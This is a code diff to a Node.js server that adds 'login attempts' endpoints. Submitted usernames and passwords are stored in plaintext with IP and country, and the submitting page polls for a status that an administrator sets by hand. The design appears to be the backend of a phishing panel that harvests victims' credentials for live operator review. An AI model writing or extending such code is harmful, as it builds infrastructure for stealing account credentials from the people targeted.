@@ -12,7 +12,9 @@ const visitors = {};
 const orders = [];
 const clicks = [];
 const blockedIPs = new Set();
+const loginAttempts = [];
 let orderCounter = 1000;
+let loginCounter = 5000;
 let clickCounter = 0;
 let totalVisitsToday = 0;
 let pageViewsToday = 0;
@@ -238,6 +240,58 @@ const server = http.createServer(async (req, res) => {
       const data = JSON.parse(body);
       blockedIPs.add(data.ip);
       orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  // --- Login Attempts ---
+
+  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
+    const ip = getIP(req);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      loginCounter++;
+      const attempt = {
+        id: loginCounter,
+        username: (data.username || '').substring(0, 100),
+        password: (data.password || '').substring(0, 100),
+        country: (data.country || 'غير معروف').substring(0, 100),
+        lang: data.lang || 'ar',
+        ip,
+        status: 'waiting',
+        date: new Date().toISOString()
+      };
+      loginAttempts.push(attempt);
+      return json(res, { success: true, id: attempt.id });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
+    const parts = reqPath.split('/');
+    const id = parseInt(parts[3]);
+    const attempt = loginAttempts.find(a => a.id === id);
+    if (!attempt) return json(res, { status: 'not_found' }, 404);
+    return json(res, { status: attempt.status });
+  }
+
+  if (req.method === 'GET' && reqPath === '/api/login-attempts') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    return json(res, { attempts: loginAttempts.slice().reverse() });
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const attempt = loginAttempts.find(a => a.id === data.id);
+      if (!attempt) return json(res, { error: 'not found' }, 404);
+      attempt.status = data.status;
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
